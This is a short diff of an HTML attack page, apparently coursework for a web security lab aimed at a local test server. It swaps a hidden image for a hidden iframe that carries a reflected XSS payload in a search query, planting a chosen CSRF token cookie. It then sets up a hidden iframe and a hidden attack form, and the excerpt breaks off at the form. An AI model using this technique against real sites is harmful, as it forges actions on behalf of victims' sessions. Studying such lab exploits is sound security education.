@@ -3,10 +3,11 @@
 <html>
 	<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 	<body>
-		<img style="display:none" name="setCSRFToken" src="http://localhost:34443/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3Dqazwsxedcrfvtgby%22%7D%3C%2Fscript%3E" width="400px" height="400px"></img>
+	<iframe style="display:none" name="setCSRFToken" src="http://localhost:34443/project3/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3D1234567890123456%22%7D%3C%2Fscript%3E" width="400px" height="400px"></iframe>
 
 
 		<iframe id = "frame" name="csrf1_frame" style="visibility:hidden;">
+
 		</iframe>	
 		
 		<form id="csrf1_attack" target="csrf1_frame" style="visibility:hidden;"
